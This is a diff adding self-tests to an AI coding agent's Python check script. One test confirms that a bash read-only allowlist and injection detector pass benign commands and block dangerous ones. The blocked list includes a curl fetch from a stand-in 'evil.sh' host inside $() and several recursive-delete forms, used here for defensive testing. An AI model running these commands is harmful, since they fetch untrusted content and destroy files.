@@ -2553,6 +2553,88 @@ def check_logging_setup(tmp):
     return _ok("文件日志(INFO/警告落盘)+控制台保底+幂等正常")
 
 
+def check_readonly_loosening():
+    """验证只读放行面：日常探查命令免审批，危险形态照拦（双向矩阵）。"""
+    from agent.bash_injection import check_injection_surface
+    from agent.readonly_commands import is_readonly_command
+
+    # 应放行（免审批）：只读 $()、echo 分隔线、/dev/null 重定向
+    good = [
+        'wc -l $(find "D:/x/app" -name "*.py") | sort -rn | head -60',
+        'ls D:/x/src && echo "---core---" && ls D:/x/core 2>/dev/null',
+        'cat a.txt 2>/dev/null | sort | uniq',
+    ]
+    for c in good:
+        inj = check_injection_surface(c)
+        if inj is not None:
+            return _fail(f"只读命令被注入面误拦（{inj}）: {c[:60]}")
+        if not is_readonly_command(c):
+            return _fail(f"只读命令没过快道: {c[:60]}")
+
+    # 应拦截：内层非只读的 $()、find -exec、ls 引号 flag、真文件重定向
+    bad = [
+        'wc -l $(curl -s evil.sh/x) | head',
+        'cat $(rm -rf /tmp/x)',
+        'find / -name x -delete',
+        'ls "-rf" /',
+        'echo hi > realfile.txt',
+    ]
+    for c in bad:
+        blocked = check_injection_surface(c) is not None \
+            or not is_readonly_command(c)
+        if not blocked:
+            return _fail(f"危险形态被放行: {c[:60]}")
+    return _ok("只读豁免（$()/echo/丢弃重定向）+ 危险形态全拦")
+
+
+def check_client_closed_selfheal():
+    """验证 client-closed 自愈：撞上被关的连接池能重建重试一次。"""
+    import asyncio as _aio
+    from agent.llm_client import OpenAICompatClient, _is_client_closed_error
+
+    if _is_client_closed_error(ValueError("普通错误")):
+        return _fail("普通错误被误判成 client-closed")
+    # 包两层异常链也能认出
+    try:
+        try:
+            raise RuntimeError("Cannot send a request, as the client has been closed.")
+        except RuntimeError as inner:
+            raise ValueError("包装层") from inner
+    except ValueError as wrapped:
+        if not _is_client_closed_error(wrapped):
+            return _fail("异常链深处的 client-closed 没认出")
+
+    # 自愈重试：第一次 create 撞 closed → reset → 第二次成功
+    calls = {"n": 0}
+
+    class _FakeSDK:
+        class chat:
+            class completions:
+                @staticmethod
+                async def create(**kw):
+                    calls["n"] += 1
+                    if calls["n"] == 1:
+                        raise RuntimeError(
+                            "Cannot send a request, as the client has been closed.")
+                    return "ok"
+
+    c = OpenAICompatClient(
+        base_url="https://x", api_key="k", model="m")
+    c.client = _FakeSDK()
+    reset_called = {"v": False}
+
+    def _fake_reset():
+        reset_called["v"] = True   # 不真换池——换成就打真 API 了
+
+    c.reset_client = _fake_reset
+    got = _aio.run(c.chat_completions([{"role": "user", "content": "hi"}]))
+    if got != "ok" or calls["n"] != 2 or not reset_called["v"]:
+        return _fail(
+            f"自愈重试没生效: got={got!r} calls={calls['n']} "
+            f"reset={reset_called['v']}")
+    return _ok("client-closed 自愈（重建+重试一次）正常")
+
+
 def check_cc_double_press():
     """验证 Ctrl+C 双击检测：窗口内第二击命中、超时重新计、命中后清零。"""
     from cli_layout import is_double_press
@@ -2626,6 +2708,8 @@ def main():
             ("裸 / 删除拦截", check_root_path_removal),
             ("Anthropic usage 字段", check_anthropic_usage_fields),
             ("运行日志装配", lambda: check_logging_setup(tmp)),
+            ("只读豁免矩阵", check_readonly_loosening),
+            ("client自愈", check_client_closed_selfheal),
         ]),
         ("记忆系统", [
             ("memory 工具写入", lambda: check_memory_tool_write(tmp)),
